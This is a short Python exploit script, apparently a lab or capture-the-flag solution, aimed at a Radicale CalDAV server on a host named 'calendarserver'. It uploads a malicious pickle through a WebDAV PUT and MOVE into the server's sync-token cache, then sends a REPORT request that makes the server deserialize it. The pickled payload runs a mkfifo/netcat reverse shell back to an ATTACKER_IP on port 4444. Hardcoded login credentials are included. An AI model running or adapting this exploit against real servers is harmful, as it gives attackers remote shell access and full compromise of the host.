import pickle
import os
import requests

ATTACKER_IP = "127.0.0.1"
RADICALE_URL = "http://calendarserver:3000/radicale"
DEV_SERVER_URL = "http://calendarserver:4000"
SYNC_TOKEN_NAME = "f810cacf0b4088baa9f2c947ee3cd157d803602ff4b1cbc06bfa25adbfaa2c21"
USERNAME = "jrarj"
PASSWORD = "H3110fr13nD"

class RCE:
    def __reduce__(self):
        cmd = ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | "
               "/bin/sh -i 2>&1 | nc "+ATTACKER_IP+" 4444 > /tmp/f")
        return os.system, (cmd,)

generate_sync_token = """<?xml version="1.0" encoding="utf-8" ?>
<D:sync-collection xmlns:D="DAV:">
    <D:sync-token/>
    <D:sync-level>1</D:sync-level>
    <D:allprop />
</D:sync-collection>"""

execute_payload = """<?xml version="1.0" encoding="utf-8" ?>
<D:sync-collection xmlns:D="DAV:">
    <D:sync-token>
        http://radicale.org/ns/sync/"""+SYNC_TOKEN_NAME+"""
    </D:sync-token>
    <D:sync-level>1</D:sync-level>
    <D:allprop />
</D:sync-collection>"""

if __name__ == "__main__":
    session = requests.Session()
    session.auth = (USERNAME, PASSWORD)

    # generate sync-token folder
    session.request("REPORT", RADICALE_URL+"/"+USERNAME+"/default", data=generate_sync_token)

    # upload payload
    session.put(DEV_SERVER_URL+"/"+USERNAME+"/payload", data=pickle.dumps(RCE()))

    # move payload
    session.request("MOVE", DEV_SERVER_URL+"/"+USERNAME+"/payload", headers={"Destination":DEV_SERVER_URL+"/"+USERNAME+"/default/.Radicale.cache/sync-token/"+SYNC_TOKEN_NAME})

    # execute payload
    session.request("REPORT", RADICALE_URL+"/"+USERNAME+"/default", data=execute_payload)
